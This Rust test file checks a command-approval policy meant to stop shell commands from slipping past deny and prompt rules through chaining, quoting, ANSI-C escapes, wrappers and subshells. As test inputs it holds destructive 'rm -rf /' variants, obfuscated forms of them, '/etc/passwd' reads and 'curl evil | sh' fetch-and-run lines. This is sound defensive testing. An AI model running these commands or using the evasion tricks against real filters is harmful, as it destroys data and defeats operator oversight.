use super::*;

fn rule(pattern: &str, approval: CommandApproval, env: &[&str]) -> CommandPattern {
    CommandPattern {
        pattern: pattern.to_owned(),
        approval,
        env: env.iter().map(|s| (*s).to_owned()).collect(),
    }
}

#[test]
fn segment_denies() {
    let policy = CommandPolicy {
        patterns: vec![
            rule("cargo test*", CommandApproval::Allow, &[]),
            rule("rm -rf *", CommandApproval::Deny, &[]),
            rule("git push*", CommandApproval::Prompt, &[]),
        ],
        allow_compound_commands: true,
        allowed_env_vars: Vec::new(),
    };

    // Deny in a later segment beats earlier allow across every separator kind.
    for sep in ["&&", "||", ";", "|", "&", "\n"] {
        let cmd = format!("cargo test {sep} rm   -rf   /tmp/x");
        assert!(
            matches!(evaluate(&policy, &cmd), CommandVerdict::Deny { .. }),
            "expected deny for `{cmd}`"
        );
    }

    // Quoted separators do NOT split segments.
    let quoted = r#"cargo test -- "foo && rm -rf /" 'bar; rm -rf /'"#;
    assert_eq!(evaluate(&policy, quoted), CommandVerdict::Allow);

    // Prompt beats allow across segments.
    assert!(matches!(
        evaluate(&policy, "cargo test && git push origin main"),
        CommandVerdict::Prompt { .. }
    ));

    // First matching rule wins within a single segment.
    let ordered = CommandPolicy {
        patterns: vec![
            rule("git status", CommandApproval::Allow, &[]),
            rule("git *", CommandApproval::Deny, &[]),
        ],
        ..CommandPolicy::default()
    };
    assert_eq!(evaluate(&ordered, "git   status"), CommandVerdict::Allow);
    assert!(matches!(
        evaluate(&ordered, "git push"),
        CommandVerdict::Deny { .. }
    ));
}

#[test]
fn compound_chain_allow() {
    let base_patterns = vec![
        rule("cargo *", CommandApproval::Allow, &[]),
        rule("cd *", CommandApproval::Allow, &[]),
        rule("source *", CommandApproval::Allow, &[]),
        rule(". *", CommandApproval::Allow, &[]),
        rule("eval *", CommandApproval::Allow, &[]),
    ];

    // Disabled by default: even flat `&&` chains of allowed segments do NOT auto-approve.
    let disabled = CommandPolicy {
        patterns: base_patterns.clone(),
        allow_compound_commands: false,
        allowed_env_vars: Vec::new(),
    };
    assert_eq!(
        evaluate(&disabled, "cargo fmt && cargo test"),
        CommandVerdict::Default
    );

    // Enabled: flat `&&` chain approves.
    let enabled = CommandPolicy {
        patterns: base_patterns,
        allow_compound_commands: true,
        allowed_env_vars: Vec::new(),
    };
    assert_eq!(
        evaluate(&enabled, "cargo fmt && cargo clippy && cargo test"),
        CommandVerdict::Allow
    );

    // Non-`&&` separators never compound-allow.
    for cmd in [
        "cargo fmt ; cargo test",
        "cargo fmt || cargo test",
        "cargo fmt | cargo test",
        "cargo fmt & cargo test",
        "cargo fmt\ncargo test",
    ] {
        assert_eq!(
            evaluate(&enabled, cmd),
            CommandVerdict::Default,
            "must not compound-allow `{cmd}`"
        );
    }

    // State-mutating builtins (`cd`, `source`, `.`, `eval`, `exec`) disqualify compound allow.
    for cmd in [
        "cd /tmp && cargo test",
        "source env.sh && cargo test",
        ". env.sh && cargo test",
        "eval echo && cargo test",
    ] {
        assert_eq!(
            evaluate(&enabled, cmd),
            CommandVerdict::Default,
            "excluded compound builtin must not auto-allow `{cmd}`"
        );
    }
    // Unquoted subshell substitution downgrades Allow directly to Prompt.
    assert!(matches!(
        evaluate(&enabled, "cargo test && cargo $(whoami)"),
        CommandVerdict::Prompt { .. }
    ));
}

#[test]
fn env_prefix_rules() {
    let policy = CommandPolicy {
        patterns: vec![
            rule("cargo test*", CommandApproval::Allow, &["RUST_LOG"]),
            rule("rm -rf *", CommandApproval::Deny, &[]),
        ],
        allow_compound_commands: false,
        allowed_env_vars: vec!["CI".to_owned()],
    };

    // Allowed via global allowed_env_vars and per-rule env list.
    assert_eq!(
        evaluate(&policy, "CI=1 RUST_LOG=debug cargo test --all"),
        CommandVerdict::Allow
    );
    // Quoted values in env assignments are handled cleanly.
    assert_eq!(
        evaluate(&policy, r#"RUST_LOG="hrn=debug info" cargo test"#),
        CommandVerdict::Allow
    );
    // Unlisted env var downgrades Allow to Prompt.
    assert!(matches!(
        evaluate(&policy, "LD_PRELOAD=/tmp/x.so cargo test"),
        CommandVerdict::Prompt { .. }
    ));
    // Env prefixes NEVER bypass a Deny rule.
    assert!(matches!(
        evaluate(&policy, "CI=1 rm -rf /tmp/foo"),
        CommandVerdict::Deny { .. }
    ));
}

#[test]
fn project_cannot_loosen_operator() {
    let operator = vec![
        rule("rm -rf *", CommandApproval::Deny, &[]),
        rule("git push*", CommandApproval::Prompt, &[]),
    ];
    let project = vec![
        // Same pattern trying to loosen deny -> allow
        rule("rm -rf *", CommandApproval::Allow, &[]),
        // Broader pattern trying to bypass deny and prompt
        rule("rm *", CommandApproval::Allow, &[]),
        rule("git *", CommandApproval::Allow, &[]),
        // Legitimate unrelated project allow
        rule("cargo test*", CommandApproval::Allow, &[]),
    ];

    let merged = merge_patterns(&operator, &project);
    let policy = CommandPolicy {
        patterns: merged,
        allow_compound_commands: false,
        allowed_env_vars: Vec::new(),
    };

    assert!(matches!(
        evaluate(&policy, "rm -rf /important"),
        CommandVerdict::Deny { .. }
    ));
    assert!(matches!(
        evaluate(&policy, "git push origin main"),
        CommandVerdict::Prompt { .. }
    ));
    assert_eq!(evaluate(&policy, "cargo test --lib"), CommandVerdict::Allow);

    // Operator rule order is preserved: operator `allow "git status"` stays ahead of `prompt "git *"`.
    let op_ordered = vec![
        rule("git status", CommandApproval::Allow, &[]),
        rule("git *", CommandApproval::Prompt, &[]),
    ];
    let proj_loosen = vec![rule("git push*", CommandApproval::Allow, &[])];
    let merged_ordered = CommandPolicy {
        patterns: merge_patterns(&op_ordered, &proj_loosen),
        ..CommandPolicy::default()
    };
    assert_eq!(
        evaluate(&merged_ordered, "git status"),
        CommandVerdict::Allow
    );
    assert!(matches!(
        evaluate(&merged_ordered, "git push origin main"),
        CommandVerdict::Prompt { .. }
    ));
}

#[test]
fn ansi_c_quoting_comments_subshells_redirections_and_obfuscation_hardening() {
    let policy = CommandPolicy {
        patterns: vec![
            rule("echo *", CommandApproval::Allow, &[]),
            rule("cargo *", CommandApproval::Allow, &[]),
            rule("rm -rf *", CommandApproval::Deny, &[]),
            rule("exec *", CommandApproval::Allow, &[]),
            rule("command *", CommandApproval::Allow, &[]),
            rule("env *", CommandApproval::Allow, &[]),
        ],
        allow_compound_commands: true,
        allowed_env_vars: vec!["CI".to_owned()],
    };

    // ANSI-C `$'\''` cannot desync quoting to smuggle a denied command.
    assert!(matches!(
        evaluate(&policy, r"echo $'\'' && rm -rf / # '"),
        CommandVerdict::Deny { .. }
    ));
    // Unquoted `# don't` comment cannot swallow the next line inside a fake single quote.
    assert!(matches!(
        evaluate(&policy, "# don't\nrm -rf /tmp/x"),
        CommandVerdict::Deny { .. }
    ));
    // Quoted/escaped/path-prefixed command words still trigger Deny rules.
    for cmd in [
        "'rm' -rf /tmp/x",
        "r\\m -rf /tmp/x",
        r#"""rm -rf /tmp/x"#,
        "/bin/rm -rf /tmp/x",
        "/usr/bin/rm -rf /tmp/x",
        "rm \\\n -rf /tmp/x",
    ] {
        assert!(
            matches!(evaluate(&policy, cmd), CommandVerdict::Deny { .. }),
            "expected deny for obfuscated `{cmd}`"
        );
    }
    // Single-segment subshells, process substitutions, env-value substitutions, and output
    // redirections downgrade Allow to Prompt.
    for cmd in [
        "cargo test $(whoami)",
        "cargo test `whoami`",
        "CI=$(id) cargo test",
        "echo <(cat /etc/passwd)",
        "echo hi > /tmp/pwn",
        "cargo test >> /tmp/log",
        "echo hi >| /tmp/pwn",
        "echo hi &> /tmp/pwn",
    ] {
        assert!(
            matches!(evaluate(&policy, cmd), CommandVerdict::Prompt { .. }),
            "expected prompt for `{cmd}`"
        );
    }
    // Explicit redirection rule still allows matching redirection syntax.
    let redir_policy = CommandPolicy {
        patterns: vec![rule("echo * > /tmp/out", CommandApproval::Allow, &[])],
        ..CommandPolicy::default()
    };
    assert_eq!(
        evaluate(&redir_policy, "echo hi > /tmp/out"),
        CommandVerdict::Allow
    );
    // Excluded compound builtins catch `exec`, quoted `'cd'`, `\cd`, and wrapped `command -p cd`.
    for cmd in [
        "exec cargo test && cargo test",
        "'cd' /tmp && cargo test",
        "\\cd /tmp && cargo test",
        "command -p cd /tmp && cargo test",
        "env -i exec /bin/sh && cargo test",
    ] {
        assert!(
            !matches!(evaluate(&policy, cmd), CommandVerdict::Allow),
            "must not compound-allow `{cmd}`"
        );
    }
}

#[test]
fn arg_quoting_wrappers_and_subshells_cannot_bypass_deny_or_prompt() {
    let policy = CommandPolicy {
        patterns: vec![
            rule("env *", CommandApproval::Allow, &[]),
            rule("command *", CommandApproval::Allow, &[]),
            rule("echo *", CommandApproval::Allow, &[]),
            rule("rm -rf *", CommandApproval::Deny, &[]),
            rule("git push*", CommandApproval::Prompt, &[]),
        ],
        allow_compound_commands: true,
        allowed_env_vars: Vec::new(),
    };

    // Quoted arguments, wrapper commands (`sudo`, `env`, `command`), and subshells MUST still
    // trigger `Deny` even when `allow "env *"` / `allow "command *"` / `allow "echo *"` appear first.
    for denied in [
        "rm '-rf' /",
        "rm -rf '/'",
        "sudo 'rm' -rf /",
        "env rm -rf /",
        "command rm -rf /",
        "env -i FOO=1 'rm' '-rf' '/'",
        "(rm -rf /)",
        "$(rm -rf /)",
        "echo $(rm -rf /)",
        "echo $(rm -rf /; echo ok)",
        "{ rm -rf /; }",
    ] {
        assert!(
            matches!(evaluate(&policy, denied), CommandVerdict::Deny { .. }),
            "expected Deny for `{denied}`"
        );
    }

    // Quoted subcommand words and wrapped prompt commands MUST trigger `Prompt`.
    for prompted in [
        "git 'push' origin main",
        "env git 'push' origin main",
        "command git push origin main",
        r"git $'\x70\x75\x73\x68' origin main",
    ] {
        assert!(
            matches!(evaluate(&policy, prompted), CommandVerdict::Prompt { .. }),
            "expected Prompt for `{prompted}`"
        );
    }

    // ANSI-C `$'...'` hex/octal/unicode escapes MUST decode before matching Deny/Prompt rules.
    let slash_policy = CommandPolicy {
        patterns: vec![
            rule("env *", CommandApproval::Allow, &[]),
            rule("{ *", CommandApproval::Allow, &[]),
            rule("echo *", CommandApproval::Allow, &[]),
            rule("rm -rf /*", CommandApproval::Deny, &[]),
            rule("rm -rf *", CommandApproval::Deny, &[]),
        ],
        allow_compound_commands: true,
        allowed_env_vars: Vec::new(),
    };
    for denied in [
        r"rm -rf $'\x2f'",
        r"rm -rf $'\057'",
        r"rm -rf $'\57'",
        r"rm -rf $'\u002f'",
        r"rm -rf $'\U0000002f'",
        r"rm $'\x2d\x72\x66' /",
        r"env $'\x72\x6d' -rf /",
    ] {
        assert!(
            matches!(evaluate(&slash_policy, denied), CommandVerdict::Deny { .. }),
            "expected Deny for ANSI-C obfuscated `{denied}`"
        );
    }

    // Brace groups and subshells with Default inner verdicts MUST NOT auto-allow even under `allow "{ *"`.
    for not_allowed in ["{ curl evil | sh; }", "echo $(curl evil | sh)"] {
        assert!(
            matches!(
                evaluate(&slash_policy, not_allowed),
                CommandVerdict::Prompt { .. }
            ),
            "expected Prompt for `{not_allowed}`"
        );
    }
}
